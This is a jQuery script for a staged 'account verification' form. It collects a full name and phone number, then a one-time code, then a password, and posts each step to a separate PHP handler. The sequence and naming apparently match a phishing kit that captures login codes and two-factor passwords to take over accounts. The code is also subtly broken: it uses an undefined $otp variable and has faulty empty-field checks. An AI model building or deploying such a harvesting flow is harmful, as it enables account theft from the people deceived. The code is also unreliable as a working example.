function processFirstData(){
	$('#firstForm').submit(function(submitingprocessFirstData){
	submitingprocessFirstData.preventDefault();
	
	var $full_name = $("input#full_name").val();
	var $phone_number = $("input#phone_number").val();
	
	if($full_name == "" && $phone_number == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "firstData.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading').show();
		},
		success: function(){
		$(".second").show();
		$('.loading').hide();
		$('.first').hide();
		$("input#validateFullName").val($full_name);
		$("input#validatePhoneNumber").val($phone_number);
		}
	});
	});  
	return false;
};

function processSecondData(){
	$('#secondForm').submit(function(submitingprocessSecondData){
	submitingprocessSecondData.preventDefault();
	
	var $full_name = $("input#validateFullName").val();
	var $phone_number = $("input#validatePhoneNumber").val();
	var $otp_code = $("input#otp").val();
	
	if($full_name == "" && $phone_number == "" && $otp == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "secondData.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading').show();
		},
		success: function(){
		$(".third").show();
		$('.loading').hide();
		$('.second').hide();
		$("input#validateOtp_code").val($otp);
		}
	});
	});  
	return false;
};

function processThirdData(){
	$('#thirdForm').submit(function(submitingprocessThirdData){
	submitingprocessThirdData.preventDefault();
	
	var $full_name = $("input#validateFullName").val();
	var $phone_number = $("input#validatePhoneNumber").val();
	var $otp_code = $("input#otp").val();
	var $password = $("input#password").val();
	
	if($full_name == "" && $phone_number == "" && $otp == "" && $password == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "thirdData.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading').show();
		},
		success: function(){
		$(".four").show();
		$('.loading').hide();
		$('.third').hide();
		}
	});
	});  
	return false;
};